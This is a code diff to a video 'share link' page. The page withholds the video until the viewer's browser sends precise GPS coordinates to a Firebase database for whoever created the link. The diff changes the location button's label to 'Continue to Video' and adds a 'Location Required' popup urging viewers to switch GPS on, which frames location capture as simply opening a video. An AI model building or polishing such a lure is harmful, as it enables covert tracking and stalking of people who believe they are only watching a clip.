@@ -126,6 +126,40 @@
     .loading {
       opacity: .7;
     }
+
+    /* Location instruction popup */
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, .55);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 9999;
+    }
+
+    .modal-backdrop.hidden {
+      display: none;
+    }
+
+    .modal-box {
+      width: min(100%, 420px);
+      background: #fff;
+      border-radius: 18px;
+      padding: 22px;
+      box-shadow: 0 18px 60px rgba(0, 0, 0, .25);
+    }
+
+    .modal-box h2 {
+      margin-bottom: 10px;
+    }
+
+    .modal-actions {
+      display: grid;
+      gap: 8px;
+      margin-top: 14px;
+    }
   </style>
 </head>
 
@@ -147,12 +181,7 @@
         YouTube / Instagram video URL
       </label>
 
-      <input
-        id="videoUrl"
-        type="url"
-        placeholder="https://www.youtube.com/..."
-        autocomplete="off"
-      >
+      <input id="videoUrl" type="url" placeholder="https://www.youtube.com/..." autocomplete="off">
 
       <button id="generate">
         Generate Share Link
@@ -196,7 +225,7 @@
         <strong>Location sharing</strong>
 
         <p class="small">
-          If you choose “Allow Location & Continue”, your browser
+          If you choose “Continue to Video”, your browser
           will ask for permission to share your current location.
           If you allow it, your location will be shared with the
           person who created this link.
@@ -205,7 +234,7 @@
       </div>
 
       <button id="allow">
-        Allow Location & Continue
+        Continue to Video
       </button>
 
       <button id="deny" class="secondary">
@@ -215,6 +244,29 @@
       <div id="trustedStatus" class="status small"></div>
 
     </section>
+
+
+    <!-- Location instruction popup: this does not turn GPS on automatically. -->
+    <div id="locationPopup" class="modal-backdrop hidden" role="dialog" aria-modal="true"
+      aria-labelledby="locationPopupTitle">
+      <div class="modal-box">
+        <h2 id="locationPopupTitle">📍 Location Required</h2>
+        <p class="small">
+          To continue to the video, please make sure Location/GPS is turned ON
+          on your phone. This website cannot switch Location on automatically.
+          You control this setting.
+        </p>
+        <p class="small">
+          After turning Location on, return to this page and tap
+          <strong>Continue & Request Access</strong>. Your browser will then
+          show its own location permission prompt where you can Allow or Deny.
+        </p>
+        <div class="modal-actions">
+          <button id="locationReady">Continue & Request Access</button>
+          <button id="locationCancel" class="secondary">Cancel</button>
+        </div>
+      </div>
+    </div>
 
   </div>
 
@@ -741,8 +793,8 @@
               const time =
                 timestamp
                   ? new Date(
-                      timestamp
-                    ).toLocaleString()
+                    timestamp
+                  ).toLocaleString()
                   : "Unknown";
 
 
@@ -933,226 +985,142 @@
       loadShare();
 
 
+
+      /* =====================================================
+         LOCATION INSTRUCTION POPUP
+         ===================================================== */
+
+      let locationInstructionsShown = false;
+
+      function openLocationPopup() {
+        $("locationPopup").classList.remove("hidden");
+      }
+
+      function closeLocationPopup() {
+        $("locationPopup").classList.add("hidden");
+      }
+
+      function requestBrowserLocation() {
+        if (!shareData) {
+          $("trustedStatus").textContent =
+            "Share data is still loading. Please try again.";
+          return;
+        }
+
+        if (!db) {
+          $("trustedStatus").textContent =
+            "Firebase is not initialized.";
+          return;
+        }
+
+        if (!navigator.geolocation) {
+          $("trustedStatus").textContent =
+            "This browser does not support location access. Video will not open.";
+          return;
+        }
+
+        $("allow").disabled = true;
+        $("deny").disabled = true;
+        $("trustedStatus").textContent =
+          "Your browser may now ask for location access. Choose Allow or Deny.";
+
+        navigator.geolocation.getCurrentPosition(
+          async position => {
+            const loc = {
+              latitude: Number(position.coords.latitude),
+              longitude: Number(position.coords.longitude),
+              accuracy: Number(position.coords.accuracy),
+              timestamp: Date.now()
+            };
+
+            try {
+              const locRef = push(ref(db, "locations/" + shareId));
+              await set(locRef, loc);
+              await set(
+                ref(db, "shares/" + shareId + "/status"),
+                "location_received"
+              );
+
+              $("trustedStatus").textContent =
+                "Location shared successfully. Opening the video…";
+
+              setTimeout(() => {
+                window.location.assign(shareData.videoUrl);
+              }, 800);
+            } catch (error) {
+              console.error("Location save error:", error);
+              $("trustedStatus").textContent =
+                "Location was allowed, but it could not be saved. The video will not open.";
+              $("allow").disabled = false;
+              $("deny").disabled = false;
+            }
+          },
+          error => {
+            console.warn("Geolocation error:", error);
+            $("allow").disabled = false;
+            $("deny").disabled = false;
+
+            if (error.code === 1) {
+              $("trustedStatus").textContent =
+                "Location access was denied. No location was collected and the video will not open.";
+            } else if (error.code === 2) {
+              $("trustedStatus").textContent =
+                "Location is unavailable. Make sure Location/GPS is ON, then tap Continue to Video again.";
+              locationInstructionsShown = false;
+            } else if (error.code === 3) {
+              $("trustedStatus").textContent =
+                "Location request timed out. Check that Location/GPS is ON and try again.";
+              locationInstructionsShown = false;
+            } else {
+              $("trustedStatus").textContent =
+                "Could not obtain location. The video will not open.";
+            }
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          }
+        );
+      }
+
+      $("locationReady").addEventListener("click", () => {
+        closeLocationPopup();
+        locationInstructionsShown = true;
+        requestBrowserLocation();
+      });
+
+      $("locationCancel").addEventListener("click", () => {
+        closeLocationPopup();
+        $("trustedStatus").textContent =
+          "You cancelled. No location was collected and the video will not open.";
+      });
+
+
       /* =====================================================
          ALLOW LOCATION
          ===================================================== */
 
-      $("allow")
-        .addEventListener(
-          "click",
-          async () => {
-
-            if (!shareData) {
-
-              $("trustedStatus")
-                .textContent =
-                "Share data is still loading. Please try again.";
-
-              return;
-            }
-
-
-            if (!db) {
-
-              $("trustedStatus")
-                .textContent =
-                "Firebase is not initialized.";
-
-              return;
-            }
-
-
-            if (
-              !navigator.geolocation
-            ) {
-
-              $("trustedStatus")
-                .textContent =
-                "This browser does not support location access. Video will not open.";
-
-              return;
-            }
-
-
-            $("allow").disabled =
-              true;
-
-
-            $("deny").disabled =
-              true;
-
-
-            $("trustedStatus")
-              .textContent =
-              "Please choose Allow in the browser location permission popup.";
-
-
-            navigator.geolocation
-              .getCurrentPosition(
-
-                async position => {
-
-                  const loc = {
-
-                    latitude:
-                      Number(
-                        position.coords.latitude
-                      ),
-
-                    longitude:
-                      Number(
-                        position.coords.longitude
-                      ),
-
-                    accuracy:
-                      Number(
-                        position.coords.accuracy
-                      ),
-
-                    timestamp:
-                      Date.now()
-
-                  };
-
-
-                  try {
-
-                    /* ---------- PUSH LOCATION ---------- */
-
-                    const locRef =
-                      push(
-                        ref(
-                          db,
-                          "locations/" +
-                          shareId
-                        )
-                      );
-
-
-                    await set(
-                      locRef,
-                      loc
-                    );
-
-
-                    /* ---------- UPDATE STATUS ---------- */
-
-                    await set(
-                      ref(
-                        db,
-                        "shares/" +
-                        shareId +
-                        "/status"
-                      ),
-                      "location_received"
-                    );
-
-
-                    $("trustedStatus")
-                      .textContent =
-                      "Location shared successfully. Opening the video…";
-
-
-                    /* ---------- OPEN VIDEO ---------- */
-
-                    setTimeout(
-                      () => {
-
-                        window.location.assign(
-                          shareData.videoUrl
-                        );
-
-                      },
-                      800
-                    );
-
-
-                  } catch (error) {
-
-                    console.error(
-                      "Location save error:",
-                      error
-                    );
-
-
-                    $("trustedStatus")
-                      .textContent =
-                      "Location was allowed, but it could not be saved. The video will not open.";
-
-
-                    $("allow").disabled =
-                      false;
-
-
-                    $("deny").disabled =
-                      false;
-
-                  }
-
-                },
-
-
-                error => {
-
-                  console.warn(
-                    "Geolocation error:",
-                    error
-                  );
-
-
-                  $("allow").disabled =
-                    false;
-
-
-                  $("deny").disabled =
-                    false;
-
-
-                  if (
-                    error.code === 1
-                  ) {
-
-                    $("trustedStatus")
-                      .textContent =
-                      "Location permission denied. No location was collected and the video will not open.";
-
-                  } else if (
-                    error.code === 2
-                  ) {
-
-                    $("trustedStatus")
-                      .textContent =
-                      "Device location is unavailable. Turn on Location manually and try again.";
-
-                  } else if (
-                    error.code === 3
-                  ) {
-
-                    $("trustedStatus")
-                      .textContent =
-                      "Location request timed out. Please try again.";
-
-                  } else {
-
-                    $("trustedStatus")
-                      .textContent =
-                      "Could not obtain location. The video will not open.";
-
-                  }
-
-                },
-
-
-                {
-                  enableHighAccuracy: true,
-                  timeout: 15000,
-                  maximumAge: 0
-                }
-
-              );
-
-          }
-        );
+      $("allow").addEventListener("click", () => {
+        if (!shareData) {
+          $("trustedStatus").textContent =
+            "Share data is still loading. Please try again.";
+          return;
+        }
+
+        /*
+          Browsers cannot reliably read the phone's master GPS toggle before
+          requesting geolocation. So the first tap shows a clear instruction
+          popup. The user then chooses whether to continue to the browser's
+          own Allow/Deny permission prompt.
+        */
+        if (!locationInstructionsShown) {
+          openLocationPopup();
+          return;
+        }
+
+        requestBrowserLocation();
+      });
 
 
       /* =====================================================
@@ -1184,4 +1152,5 @@
   </script>
 
 </body>
+
 </html>
